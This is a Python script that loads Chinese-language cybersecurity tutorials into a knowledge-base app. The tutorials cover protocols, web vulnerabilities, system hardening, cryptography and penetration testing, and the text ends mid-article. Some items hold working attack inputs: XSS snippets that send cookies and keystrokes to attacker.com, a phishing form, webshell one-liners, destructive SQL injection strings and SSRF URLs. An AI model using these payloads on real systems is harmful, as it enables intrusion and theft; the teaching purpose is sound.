"""
网络安全知识库数据导入脚本
运行方式: python import_knowledge.py
"""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import create_app, db
from app.models.knowledge import Category, KnowledgeItem, KnowledgeTag
from app.models.user import User

# 网络安全知识数据 - 使用与数据库一致的分类名
CATEGORIES_AND_ITEMS = {
    # 分类1：网络安全基础 (已有0条)
    "网络安全基础": {
        "description": "计算机网络基础知识，包括协议、安全原理等",
        "items": [
            {
                "title": "TCP/IP协议体系结构",
                "summary": "介绍TCP/IP四层模型及各层主要协议",
                "content": """# TCP/IP协议体系结构

## 四层模型

TCP/IP协议栈采用四层结构，从下往上依次是：

### 1. 链路层（Link Layer）
负责在物理网络上传输数据帧，包括：
- **ARP协议**：地址解析协议，将IP地址转换为MAC地址
- **RARP协议**：反向地址解析协议
- **以太网**：最常见的局域网技术

### 2. 网络层（Internet Layer）
负责IP地址寻址和路由：
- **IP协议**：核心协议，分为IPv4和IPv6
- **ICMP协议**：互联网控制消息协议，用于诊断和报错
- **IGMP协议**：组播协议

### 3. 传输层（Transport Layer）
提供端到端的通信服务：
- **TCP协议**：面向连接、可靠传输、流量控制
- **UDP协议**：无连接、高效传输、低延迟

### 4. 应用层（Application Layer）
为用户提供网络服务：
- **HTTP/HTTPS**：Web访问
- **DNS**：域名解析
- **SMTP/POP3/IMAP**：电子邮件
- **FTP**：文件传输

## 安全相关知识点

### TCP三次握手与SYN Flood攻击
1. 客户端发送SYN包
2. 服务器返回SYN-ACK包
3. 客户端发送ACK包完成连接

**SYN Flood攻击原理**：攻击者发送大量SYN包但不完成三次握手，导致服务器半开连接耗尽资源。

### DNS安全
- **DNS欺骗**：攻击者伪造DNS响应
- **DNS隧道**：利用DNS协议传输隐蔽数据
- **防护措施**：使用DNSSEC、配置DNS解析安全策略""",
                "difficulty": "easy",
                "source": "网络安全基础知识整理",
                "tags": ["TCP/IP", "协议", "网络层"]
            },
            {
                "title": "DNS协议工作原理与安全",
                "summary": "DNS解析过程、常见攻击方式及防护措施",
                "content": """# DNS协议工作原理与安全

## DNS系统概述

DNS（Domain Name System）是互联网的核心服务，用于将域名解析为IP地址。

## DNS查询过程

### 递归查询
客户端发起域名解析请求给本地DNS服务器，本地DNS服务器负责完整查询过程并返回最终结果。

### 迭代查询
DNS服务器之间采用迭代查询，当本地DNS没有缓存时，会依次查询根域名服务器、顶级域名服务器、权威域名服务器。

## 常见DNS攻击

### 1. DNS缓存投毒
攻击者向DNS服务器发送伪造的响应，污染DNS缓存，使用户访问恶意站点。

### 2. DNS欺骗
中间人攻击的一种，拦截DNS查询并返回伪造的IP地址。

### 3. DNS隧道
利用DNS协议传输数据，绕过网络防火墙。攻击者可以通过DNS查询请求传输恶意代码或数据。

### 4. DDoS攻击
对DNS服务器发起分布式拒绝服务攻击，导致DNS服务不可用。

## 防护措施

1. **启用DNSSEC**：为DNS响应添加数字签名验证
2. **限制递归查询**：只对内部网络提供递归服务
3. **使用可信的DNS服务器**：如8.8.8.8、1.1.1.1
4. **监控DNS日志**：及时发现异常查询行为
5. **部署DNS防火墙**：过滤恶意域名和查询""",
                "difficulty": "medium",
                "source": "DNS安全分析",
                "tags": ["DNS", "协议", "网络安全"]
            },
            {
                "title": "HTTP/HTTPS协议详解",
                "summary": "HTTP协议工作原理及HTTPS安全机制",
                "content": """# HTTP/HTTPS协议详解

## HTTP协议

### HTTP工作原理
HTTP（HyperText Transfer Protocol）是无状态的请求-响应协议。

### HTTP请求方法
| 方法 | 说明 | 安全性 |
|------|------|--------|
| GET | 获取资源 | 低 |
| POST | 提交数据 | 中 |
| PUT | 上传资源 | 低 |
| DELETE | 删除资源 | 低 |
| HEAD | 获取头部 | 低 |

### HTTP状态码
- **1xx**：信息响应
- **2xx**：成功（200 OK）
- **3xx**：重定向（301、302）
- **4xx**：客户端错误（404、403）
- **5xx**：服务器错误（500、502）

## HTTPS安全机制

### SSL/TLS握手过程
1. 客户端发送支持的加密算法列表
2. 服务器选择算法并发送证书
3. 客户端验证证书有效性
4. 双方生成会话密钥
5. 加密通信开始

### HTTPS优势
- **加密传输**：防止中间人窃听
- **身份认证**：验证服务器身份
- **数据完整性**：防止数据篡改

### 常见HTTPS安全问题
1. **心脏滴血漏洞**：OpenSSL心跳扩展实现缺陷
2. **SSL Strip攻击**：将HTTPS降级为HTTP
3. **证书伪造**：使用自签名或伪造证书
4. **弱加密算法**：使用已破解的加密算法

## 安全建议
- 强制使用HTTPS
- 配置HSTS（HTTP严格传输安全）
- 禁用SSLv2/v3和TLS1.0
- 使用强加密套件""",
                "difficulty": "medium",
                "source": "Web安全基础",
                "tags": ["HTTP", "HTTPS", "TLS", "SSL"]
            }
        ]
    },
    "Web 安全": {
        "description": "Web应用安全漏洞原理与防御",
        "items": [
            {
                "title": "SQL注入漏洞原理与防御",
                "summary": "SQL注入攻击原理、类型及防护方法",
                "content": """# SQL注入漏洞原理与防御

## 漏洞原理

SQL注入（SQL Injection）是由于Web应用程序对用户输入数据未做充分验证和转义，导致攻击者可以在SQL语句中插入恶意代码。

## 攻击原理示例

### 正常查询
```sql
SELECT * FROM users WHERE username='admin' AND password='123456'
```

### 注入后
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```
`'--` 将后面的密码验证注释掉，攻击者无需密码即可登录。

## SQL注入类型

### 1. 基于错误的注入
通过构造特殊输入引发数据库错误，从错误信息中获取数据库结构。

### 2. 联合查询注入
使用UNION语句合并恶意查询结果。
```sql
SELECT name,email FROM users UNION SELECT username,password FROM admin_users--
```

### 3. 布尔盲注
根据页面返回真假判断信息。
```sql
' AND (SELECT COUNT(*) FROM users) > 0 --
```

### 4. 时间盲注
利用数据库延时函数判断条件。
```sql
' AND IF(1=1, SLEEP(5), 0) --
```

### 5. 堆叠查询
执行多条SQL语句。
```sql
'; DROP TABLE users; --
```

## 防御措施

### 1. 参数化查询（最佳方案）
```python
# 使用预编译语句
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

### 2. 输入验证
- 白名单验证
- 类型检查
- 长度限制
- 特殊字符过滤

### 3. 转义处理
对特殊字符进行转义：
- 单引号 `'` → `''`
- 双引号 `"` → `""`
- 反斜杠 `\\` → `\\\\`

### 4. 最小权限原则
数据库账户只授予必要的权限，避免使用管理员权限连接Web应用。

### 5. 错误处理
生产环境关闭详细错误信息，使用自定义错误页面。""",
                "difficulty": "medium",
                "source": "OWASP Top 10",
                "tags": ["SQL注入", "Web安全", "OWASP"]
            },
            {
                "title": "XSS跨站脚本攻击详解",
                "summary": "XSS攻击类型、原理及防护策略",
                "content": """# XSS跨站脚本攻击详解

## 漏洞原理

XSS（Cross-Site Scripting）攻击是指攻击者通过在网页中注入恶意JavaScript代码，当其他用户浏览该网页时，恶意代码会在用户浏览器中执行。

## XSS攻击类型

### 1. 反射型XSS
恶意脚本作为用户输入的一部分被服务器接收，然后未经转义地返回给用户。

**攻击流程**：
1. 攻击者构造恶意URL
2. 用户点击链接访问目标网站
3. 网站将恶意脚本反射回用户浏览器
4. 脚本在用户浏览器执行

**示例URL**：
```
http://example.com/search?q=<script>alert(document.cookie)</script>
```

### 2. 存储型XSS
恶意脚本被永久存储在目标服务器（如数据库、评论、论坛帖子），所有访问该数据的用户都会被攻击。

**常见注入点**：
- 评论区、留言板
- 用户资料
- 文章发布

### 3. DOM型XSS
不涉及服务器处理，纯客户端漏洞。恶意脚本通过操作DOM对象来执行。

**示例代码**：
```javascript
// 直接将用户输入插入HTML
document.getElementById("output").innerHTML = location.hash;
```

## XSS攻击危害

1. **窃取Cookie/Session**：获取用户认证信息
2. **键盘记录**：监听用户键盘输入
3. **钓鱼攻击**：修改页面内容欺骗用户
4. **植入恶意软件**：下载并执行恶意程序
5. **蠕虫传播**：自动传播XSS攻击

## 防御措施

### 1. 输入验证
- 白名单验证
- 限制输入长度
- 过滤特殊字符

### 2. 输出编码
| 上下文 | 编码方式 |
|--------|----------|
| HTML内容 | `&lt;` `&gt;` `&amp;` |
| HTML属性 | 使用双引号包裹，编码特殊字符 |
| JavaScript | JSON编码或十六进制 |
| URL参数 | URL编码 |

### 3. 设置安全头部
```http
Content-Security-Policy: script-src 'self'
X-XSS-Protection: 1; mode=block
```

### 4. HttpOnly Cookie
设置Cookie的HttpOnly属性，防止JavaScript访问。
```http
Set-Cookie: session=xxx; HttpOnly
```

### 5. 使用现代框架
React、Vue等框架默认对输出进行转义。""",
                "difficulty": "medium",
                "source": "Web应用安全",
                "tags": ["XSS", "跨站脚本", "Web安全"]
            },
            {
                "title": "CSRF跨站请求伪造",
                "summary": "CSRF攻击原理与防护方法",
                "content": """# CSRF跨站请求伪造

## 漏洞原理

CSRF（Cross-Site Request Forgery）攻击者利用用户已登录的身份，诱导用户访问恶意页面，在用户不知情的情况下以用户身份执行非自愿的操作。

## 攻击原理

### 攻击条件
1. 用户已登录目标网站
2. 攻击者知道请求格式和参数
3. 用户访问恶意页面

### 攻击流程
1. 用户登录网站A，获取有效Session
2. 用户访问攻击者构造的恶意页面B
3. 页面B自动向网站A发送请求（图片、表单、AJAX）
4. 浏览器自动携带Cookie发送请求
5. 网站A认为是合法请求，执行相应操作

## 攻击示例

### 图片请求
```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

### 表单请求
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

## 防御措施

### 1. CSRF Token（最佳方案）
服务器生成随机Token，在表单和Session中各存储一份，提交时验证一致性。

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机Token值">
</form>
```

### 2. 验证请求来源（Referer/Origin）
检查HTTP头中的Referer或Origin字段。

```python
if request.headers.get('Referer') != 'https://trusted.com':
    return403
```

### 3. 双重提交Cookie
将Token同时放在Cookie和请求参数中，服务器验证两者是否匹配。

### 4. 敏感操作验证
对重要操作要求重新验证（如密码、验证码）。

### 5. SameSite Cookie
设置Cookie的SameSite属性。
```http
Set-Cookie: session=xxx; SameSite=Strict
```

## 最佳实践
- 优先使用CSRF Token
- 敏感操作使用验证码
- 设置合理的Cookie属性
- 限制GET请求的操作""",
                "difficulty": "medium",
                "source": "Web安全实践",
                "tags": ["CSRF", "Web安全", "会话安全"]
            },
            {
                "title": "SSRF服务器端请求伪造",
                "summary": "SSRF漏洞原理、攻击方式及防御",
                "content": """# SSRF服务器端请求伪造

## 漏洞原理

SSRF（Server-Side Request Forgery）攻击者利用Web应用程序的服务器作为代理，向内部系统或外部系统发起请求，从而突破网络边界限制。

## 与CSRF的区别

| 维度 | CSRF | SSRF |
|------|------|------|
| 攻击目标 | 用户的操作 | 服务器的操作 |
| 受害者 | 用户浏览器 | 服务器 |
| 利用条件 | 用户已登录 | 服务器能访问 |

## 攻击场景

### 1. 访问内部系统
```
# 攻击者让服务器访问内部数据库
http://example.com/fetch?url=http://192.168.1.100/admin
```

### 2. 扫描内网端口
```
http://example.com/fetch?url=http://192.168.1.1:22
http://example.com/fetch?url=http://192.168.1.1:3306
```

### 3. 读取本地文件
```
http://example.com/fetch?url=file:///etc/passwd
```

### 4. 攻击云服务元数据
```
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

### 5. 探测内部服务
利用服务器向内部服务发送探测请求，根据响应时间判断服务存在。

## 危害

1. 端口扫描内网主机
2. 读取本地敏感文件
3. 攻击内部Web服务
4. 访问云服务商元数据
5. 利用Gopher协议攻击Redis、Memcached

## 防御措施

### 1. URL验证
- 使用URL解析库验证URL
- 检查host是否为内网IP
- 禁止访问私有IP地址段

```python
from ipaddress import ip_address, ip_network

# 定义内网IP段
private_networks = [
    ip_network('10.0.0.0/8'),
    ip_network('172.16.0.0/12'),
    ip_network('192.168.0.0/16'),
    ip_network('127.0.0.0/8')
]

def is_private_ip(url):
    host = urlparse(url).hostname
    ip = ip_address(host)
    return any(ip in net for net in private_networks)
```

### 2. 协议限制
- 限制允许的协议（http/https）
- 禁止file://、dict://、gopher://等

### 3. 白名单
只允许访问预定义的URL列表。

### 4. 禁用不需要的协议
配置服务器禁止处理file://、dict://等协议。""",
                "difficulty": "hard",
                "source": "API安全",
                "tags": ["SSRF", "Web安全", "服务器安全"]
            },
            {
                "title": "文件上传漏洞与防护",
                "summary": "文件上传漏洞原理及安全上传策略",
                "content": """# 文件上传漏洞与防护

## 漏洞原理

文件上传功能如果没有正确验证上传文件的类型和内容，攻击者可以上传恶意文件（如WebShell）并在服务器上执行。

## 攻击方式

### 1. WebShell上传
上传包含恶意代码的文件，获取服务器控制权。

```php
<?php system($_GET['cmd']); ?>
```

```asp
<% eval request("cmd") %>
```

### 2. 绕过验证
- **扩展名绕过**：1.php.jpg
- **大小写绕过**：1.PhP
- **空格/点绕过**：1.php .
- **Content-Type欺骗**：修改MIME类型
- **00截断**：1.php\\x00.jpg

### 3. 配合其他漏洞
- .htaccess重写绕过
- .user.ini自动包含
- 解析漏洞（Apache/nginx）

## 防御措施

### 1. 文件类型验证
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \\
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

### 2. MIME类型验证
```python
if file.content_type not in ['image/png', 'image/jpeg']:
    abort(403)
```

### 3. 文件内容验证
```python
# 读取文件头验证图片类型
def verify_image(file):
    start = file.read(10)
    file.seek(0)
    if start[:8] == b'\\x89PNG\\r\\n\\x1a\\n':
        return 'png'
    if start[:2] == b'\\xff\\xd8':
        return 'jpeg'
    return None
```

### 4. 存放策略
- 上传文件存储在Web根目录之外
- 使用随机文件名
- 设置只读权限
- 配置MIME类型映射

### 5. 权限控制
- 上传目录禁止执行
- 使用低权限用户运行Web服务

### 6. 图片处理
对上传图片进行重新生成（压缩、转换格式），破坏恶意代码。""",
                "difficulty": "medium",
                "source": "Web应用安全",
                "tags": ["文件上传", "WebShell", "Web安全"]
            }
        ]
    },
    "系统安全": {
        "description": "操作系统安全配置与加固",
        "items": [
            {
                "title": "Linux系统安全加固",
                "summary": "Linux系统安全加固的常用方法",
                "content": """# Linux系统安全加固

## 用户与权限管理

### 1. 最小权限原则
- 创建专用服务账户
- 禁止root直接登录
- 使用sudo提权

```bash
# 创建不可登录的系统账户
useradd -r -s /sbin/nologin nginx

# 配置sudo权限
echo "username ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx" >> /etc/sudoers.d/custom
```

### 2. 密码策略
```bash
# /etc/login.defs
PASS_MAX_DAYS 90      # 密码最大使用天数
PASS_MIN_DAYS 7       # 密码最小使用天数
PASS_MIN_LEN 12       # 最小密码长度
PASS_WARN_AGE 7       # 密码过期提醒天数
```

### 3. SSH安全配置
```bash
# /etc/ssh/sshd_config
PermitRootLogin no                    # 禁止root登录
PasswordAuthentication no             # 禁用密码认证
PubkeyAuthentication yes              # 启用公钥认证
MaxAuthTries 3                        # 最大认证尝试次数
ClientAliveInterval 300                # 客户端存活检测
```

## 文件系统安全

### 1. 重要文件权限
```bash
chmod 600 /etc/shadow               # 影子文件
chmod 644 /etc/passwd               # 用户信息文件
chmod 640 /etc/ssh/sshd_config      # SSH配置
chattr +i /etc/passwd                # 不可修改属性
chattr +i /etc/shadow
```

### 2. 挂载选项
```bash
# /etc/fstab
/dev/sda1 /boot ext4 defaults,nosuid,nodev,noexec 0 2
/dev/sda2 /tmp ext4 defaults,nosuid,nodev,noexec 0 2
/dev/sda3 /var ext4 defaults,nosuid,nodev 0 2
```

## 服务与进程安全

### 1. 禁用不必要的服务
```bash
systemctl disable telnet.socket
systemctl disable vsftpd
systemctl stop cups                 # 打印服务
```

### 2. 网络参数加固
```bash
# 防止IP欺骗
echo "1" > /proc/sys/net/ipv4/conf/all/rp_filter
echo "1" > /proc/sys/net/ipv4/conf/default/rp_filter

# 禁止ICMP重定向
echo "0" > /proc/sys/net/ipv4/conf/all/accept_redirects
echo "0" > /proc/sys/net/ipv6/conf/all/accept_redirects

# 开启 SYN Cookie
echo "1" > /proc/sys/net/ipv4/tcp_syncookies
```

### 3. 隐藏版本信息
```bash
# /etc/nginx/nginx.conf
server_tokens off;

# /etc/apache2/apache2.conf
ServerTokens Prod
ServerSignature Off
```

## 日志与审计

### 1. 配置Auditd
```bash
# 监控重要文件
auditctl -w /etc/passwd -p wa -k identity
auditctl -w /etc/shadow -p wa -k identity
auditctl -w /usr/bin/sudo -p x -k privilege
```

### 2. 日志集中管理
- 配置rsyslog远程日志
- 使用ELK或Graylog集中分析""",
                "difficulty": "hard",
                "source": "Linux系统管理",
                "tags": ["Linux", "系统加固", "权限管理"]
            },
            {
                "title": "Windows系统安全加固",
                "summary": "Windows系统安全加固配置指南",
                "content": """# Windows系统安全加固

## 账户安全

### 1. 管理员账户策略
- 重命名Administrator账户
- 设置强密码
- 创建陷阱管理员账户

```powershell
# 重命名管理员账户
net user Administrator NewAdminName

# 创建陷阱账户
net user hackedadmin /add
net localgroup Administrators hackedadmin /add
```

### 2. 密码策略
```
本地安全策略 → 账户策略 → 密码策略
- 密码长度最小值: 12
- 密码必须符合复杂性: 启用
- 密码最长使用时间: 90天
- 强制密码历史: 5个
```

### 3. 账户锁定策略
```
账户锁定阈值: 5次
账户锁定时间: 30分钟
重置账户锁定计数器: 30分钟
```

## 服务安全

### 1. 禁用不必要的服务
```powershell
# 禁用Remote Registry
sc config RemoteRegistry start= disabled

# 禁用Telnet
sc config TlntSvr start= disabled

# 禁用Windows Search
sc config WSearch start= disabled
```

### 2. 服务加固原则
- 使用专用服务账户
- 限制服务权限
- 定期更新服务

## 网络安全

### 1. 防火墙配置
```powershell
# 启用防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 允许指定端口入站
New-NetFirewallRule -DisplayName "HTTP" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow
```

### 2. SMB安全
```powershell
# 禁用SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false
Set-SmbServerConfiguration -EnableSMB2Protocol $true
```

### 3. Remote Desktop安全
```
系统属性 → 远程 → 远程桌面
- 仅允许使用网络级别身份验证的计算机连接
- 配置账户锁定策略
```

## 日志审计

### 1. 开启审计策略
```
本地安全策略 → 本地策略 → 审核策略
- 审核账户登录事件: 成功/失败
- 审核账户管理: 成功/失败
- 审核对象访问: 成功/失败
```

### 2. 日志大小配置
```powershell
# 设置安全日志最大大小
wevtutil sl Security /ms:209715200
```

## PowerShell安全

### 1. 脚本签名
```powershell
# 仅允许签名脚本运行
Set-ExecutionPolicy AllSigned
```

### 2. 防御Empire等工具
```powershell
# 限制PowerShell v2
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellv2
```""",
                "difficulty": "hard",
                "source": "Windows安全",
                "tags": ["Windows", "系统加固", "安全配置"]
            }
        ]
    },
    "密码学": {
        "description": "密码学基础与安全应用",
        "items": [
            {
                "title": "对称加密与非对称加密",
                "summary": "两种加密体制的原理、区别与应用场景",
                "content": """# 对称加密与非对称加密

## 对称加密

### 原理
加密和解密使用相同的密钥。

```
明文 + 密钥 → 密文
密文 + 密钥 → 明文
```

### 常用算法

| 算法 | 密钥长度 | 安全性 | 速度 |
|------|----------|--------|------|
| AES | 128/192/256位 | 高 | 快 |
| DES | 56位 | 低（已破解） | 快 |
| 3DES | 168位 | 中 | 慢 |
| ChaCha20 | 256位 | 高 | 快 |

### 优缺点
**优点**：速度快、资源消耗低
**缺点**：密钥分发困难、不适合大规模用户

### 应用场景
- 数据加密（文件、磁盘）
- HTTPS通信中的数据加密
- 数据库加密

## 非对称加密

### 原理
使用公钥和私钥配对进行加密解密。

```
加密: 明文 + 公钥 → 密文
解密: 密文 + 私钥 → 明文
签名: 明文 + 私钥 → 签名
验证: 明文 + 公钥 + 签名 → 验证结果
```

### 常用算法

| 算法 | 密钥长度 | 应用 |
|------|----------|------|
| RSA | 2048/4096位 | 密钥交换、数字签名 |
| ECC | 256/384位 | 移动端加密 |
| DH | 可变 | 密钥交换 |
| DSA | 1024-3072位 | 数字签名 |

### 优缺点
**优点**：密钥分发方便、支持数字签名
**缺点**：速度慢、资源消耗高

### 应用场景
- HTTPS握手（密钥交换）
- 数字证书
- 电子签名
- 加密邮件

## 混合加密

实际应用中通常结合两者：

1. 使用非对称加密传输对称密钥
2. 使用对称加密加密实际数据

```
# TLS/SSL握手过程
1. 客户端 → 服务器: 支持的加密算法 + 随机数
2. 服务器 → 客户端: 证书 + 公钥 + 随机数
3. 客户端: 验证证书，用公钥加密预主密钥
4. 双方用预主密钥计算会话密钥
5. 使用对称加密进行通信
```

## 常见安全问题

1. **使用弱加密算法**：DES、MD5已被破解
2. **密钥管理不当**：密钥硬编码、存储不安全
3. **不正确的IV使用**：CBC模式中IV必须随机
4. **ECB模式安全性**：相同明文块产生相同密文块""",
                "difficulty": "medium",
                "source": "密码学基础",
                "tags": ["加密", "AES", "RSA", "密码学"]
            },
            {
                "title": "哈希算法与消息认证",
                "summary": "哈希函数原理及HMAC消息认证",
                "content": """# 哈希算法与消息认证

## 哈希函数

### 特性
1. **单向性**：无法从哈希值反推原始数据
2. **抗碰撞性**：无法找到相同哈希值的不同输入
3. **固定输出**：无论输入多长，输出长度固定
4. **雪崩效应**：输入微小变化导致输出巨大差异

### 常用哈希算法

| 算法 | 输出长度 | 安全性 | 应用 |
|------|----------|--------|------|
| MD5 | 128位 | 不安全 | 完整性校验（非安全场景）|
| SHA-1 | 160位 | 不安全 | 数字签名（旧系统）|
| SHA-256 | 256位 | 安全 | 通用加密 |
| SHA-3 | 可变 | 安全 | 未来应用 |
| BLAKE2 | 可变 | 安全 | 高性能场景 |

### 应用场景
- 文件完整性校验
- 密码存储（需加盐）
- 数字签名
- 区块链

## 密码存储

### 不安全的方式
```python
# 错误：明文或简单哈希存储
password_hash = md5(password)  # 可被彩虹表破解
```

### 正确的方式：加盐哈希
```python
import bcrypt
import hashlib
import os

def hash_password(password):
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode(), salt)
    return hashed

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)
```

### 使用scrypt或argon2
```python
import hashlib
import os

def hash_password_argon2(password):
    import argon2
    ph = argon2.PasswordHasher()
    return ph.hash(password)

def verify_password_argon2(password, hashed):
    ph = argon2.PasswordHasher()
    return ph.verify(hashed, password)
```

## 消息认证码（HMAC）

### 原理
在哈希基础上增加密钥，防止消息被篡改。

```
HMAC = Hash(密钥 + 消息) 或 Hash(消息 + 密钥)
```

### Python实现
```python
import hmac
import hashlib

def create_mac(message, key):
    return hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()

def verify_mac(message, key, mac):
    expected_mac = create_mac(message, key)
    return hmac.compare_digest(expected_mac, mac)
```

### 应用场景
- API请求签名
- 消息完整性验证
- 防止重放攻击（加入时间戳或nonce）

## 安全建议

1. 不要使用MD5/SHA-1存储密码
2. 使用足够强度的密钥长度（SHA-256以上）
3. 密码存储使用bcrypt/scrypt/argon2
4. HMAC验证时使用常量时间比较""",
                "difficulty": "medium",
                "source": "密码学应用",
                "tags": ["哈希", "MD5", "SHA", "HMAC"]
            },
            {
                "title": "数字签名与数字证书",
                "summary": "数字签名原理及PKI证书体系",
                "content": """# 数字签名与数字证书

## 数字签名

### 原理
使用私钥对消息哈希值进行加密，生成签名。

```
签名过程：
1. 计算消息哈希: hash(message)
2. 用私钥加密哈希: signature = encrypt(private_key, hash)
3. 发送消息 + 签名

验证过程：
1. 用公钥解密签名: hash' = decrypt(public_key, signature)
2. 计算消息哈希: hash = hash(message)
3. 比较 hash == hash'
```

### 常用算法
- **RSA签名**：基于RSA算法
- **DSA**：数字签名算法
- **ECDSA**：椭圆曲线数字签名算法
- **EdDSA**：爱德华曲线签名算法

### 应用场景
1. **代码签名**：证明软件来源可信
2. **文档签名**：电子合同、电子公文
3. **SSL/TLS**：服务器身份认证
4. **区块链**：交易签名

## 数字证书

### X.509证书结构
```
证书内容：
- 版本号
- 序列号
- 签名算法
- 颁发者信息
- 有效期
- 主体信息（持有者）
- 公钥信息
- 扩展信息
- 签名值
```

### 证书颁发机构（CA）
1. **根CA**：自签名，信任起点
2. **中间CA**：由根CA签发
3. **终端实体**：服务器/用户证书

### 证书链验证
```
用户证书 → 中间CA1 → 中间CA2 → 根CA
验证过程：
1. 验证用户证书签名（用中间CA1公钥）
2. 验证中间CA1证书签名（用中间CA2公钥）
3. 验证中间CA2证书签名（用根CA公钥）
4. 验证根CA自签名
5. 检查证书有效期、吊销状态等
```

## 证书格式

### PEM格式（Base64编码）
```
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAJC1...
-----END CERTIFICATE-----
```

### DER格式（二进制）
二进制格式，用于Java密钥库等。

### 转换工具
```bash
# PEM转DER
openssl x509 -in cert.pem -outform der -out cert.der

# 验证证书
openssl verify -CAfile ca.pem cert.pem
```

## PKI体系

### 组件
1. **CA**：颁发和吊销证书
2. **RA**：注册机构，验证身份
3. **证书库**：存储和检索证书
4. **吊销列表（CRL）**：已吊销证书列表
5. **OCSP**：在线证书状态协议

### 证书吊销原因
- 私钥泄露
- 主体信息变更
- 证书签发错误
- 终止使用

## 自签名证书

### 创建自签名证书
```bash
# 创建私钥和证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# 查看证书信息
openssl x509 -in cert.pem -text -noout
```

### 浏览器警告
浏览器不信任自签名证书，因为无法验证证书链。""",
                "difficulty": "hard",
                "source": "PKI体系",
                "tags": ["数字签名", "证书", "CA", "PKI"]
            }
        ]
    },
    "渗透测试": {
        "description": "渗透测试方法论与常用工具",
        "items": [
            {
                "title": "信息收集技术",
                "summary": "渗透测试前的侦察与信息收集方法",
                "content": """# 信息收集技术

## 信息收集概述

渗透测试的第一步是尽可能多地收集目标信息。

## 被动信息收集

不直接接触目标，利用公开资源获取信息。

### 1. 域名信息收集

```bash
# whois查询
whois example.com

# DNS查询
dig +short example.com A
dig +short example.com MX
dig +short example.com NS
dig +short example.com TXT

# 子域名枚举
amass enum -passive -d example.com
subfinder -d example.com
```

### 2. IP信息

```bash
# IP归属查询
whois 1.2.3.4

# IP历史记录
SecurityTrails API

# CDN识别
curl -I www.example.com
```

### 3. 技术指纹

```bash
# Wappalyzer浏览器插件
# WhatWeb扫描
whatweb -v example.com

# 查看Headers
curl -I https://example.com

# 查看robots.txt
curl -s https://example.com/robots.txt
```

### 4. 邮箱和人员信息

```bash
# theHarvester
theHarvester -d example.com -b google

# LinkedIn信息收集
```

### 5. 泄露情报

- **Shodan**：网络空间搜索引擎
- **Censys**：证书和主机搜索
- **FOFA**：国内网络空间测绘
- **GitHub**：代码仓库泄露

## 主动信息收集

直接与目标交互，需谨慎避免触发告警。

### 1. 端口扫描

```bash
# nmap扫描
nmap -sV -sC -O -p- 1.2.3.4

# 快速扫描常见端口
nmap -F 1.2.3.4

# UDP扫描
nmap -sU 1.2.3.4

# 服务探测
nmap -sV --version-intensity 5 1.2.3.4
```

### 2. 漏洞扫描

```bash
# OpenVAS
openvas-start

# Nessus
nessuscli scan --host 1.2.3.4

# nuclei
nuclei -u https://example.com
```

### 3. Web目录扫描

```bash
# gobuster
gobuster dir -u https://example.com -w wordlist.txt

# dirb
dirb https://example.com wordlist.txt

# ffuf
ffuf -w wordlist.txt -u https://example.com/FUZZ
```

### 4. 社工库查询

- 密码dump查询
- 邮箱泄露查询（HaveIBeenPwned）

## 信息收集工具集

| 工具 | 用途 |
|------|------|
| Maltego | 图形化情报收集 |
| theHarvester | 邮箱和子域名收集 |
| Recon-ng | Web侦察框架 |
| Amass | 子域名枚举 |
| Shodan | 网络空间搜索 |

## 收集信息清单

- [ ] 域名和子域名
- [ ] IP地址范围
- [ ] DNS记录
- [ ] 邮件服务器
- [ ] 员工信息和邮箱
- [ ] 技术栈（Web服务器、语言、框架）
- [ ] 公开漏洞信息
- [ ] 代码仓库泄露
- [ ] 历史漏洞数据""",
                "difficulty": "medium",
                "source": "渗透测试指南",
                "tags": ["信息收集", "侦察", "nmap", "渗透测试"]
            },
            {
                "title": "Web漏洞利用与防御",
                "summary": "常见Web漏洞的利用技术和防护方法",
                "content": """# Web漏洞利用与防御

## OWASP Top 10 (2021)

1. 访问控制失效
2. 加密失败
3. 注入
4. 不安全设计
5. 安全配置错误
6. 使用已知漏洞组件
7. 身份认证失效
8. 软件和数据完整性失败
9. 日志和监控不足
10. 服务端请求伪造

## 漏洞利用技术

### SQL注入利用

```bash
# 手动测试
' OR '1'='1
' UNION SELECT NULL--
' AND 1=1--

# sqlmap自动利用
sqlmap -u "http://target.com/product?id=1" --batch --dbs
sqlmap -u "http://target.com/product?id=1" -D database --tables
sqlmap -u "http://target.com/product?id=1" -D database -T users --dump
```

### XSS利用

```html
# 基本弹框测试
<script>alert(document.cookie)</script>

# 窃取Cookie
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>

# 键盘记录
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?k=' + e.key)
}
</script>

# 钓鱼攻击
<script>
document.body.innerHTML = '<h1>系统维护中，请重新登录</h1><form action=http://attacker.com><input name="u"><input name="p"></form>'
</script>
```

### 文件上传利用

```bash
# 绕过技巧
1.php.jpg        # 双重扩展名
1.php%00.jpg     # 00截断
1.php.           # 末尾点
test.PHP         # 大小写

# 上传WebShell
<?php system($_GET['cmd']); ?>

# 常用WebShell
冰蝎、蚁剑、哥斯拉
```

## 漏洞扫描工具

### 专业扫描器

| 工具 | 特点 |
|------|------|
| Burp Suite | Web渗透测试平台 |
| OWASP ZAP | 开源Web扫描器 |
| Nikto | Web服务器扫描 |
| SQLMap | SQL注入检测 |
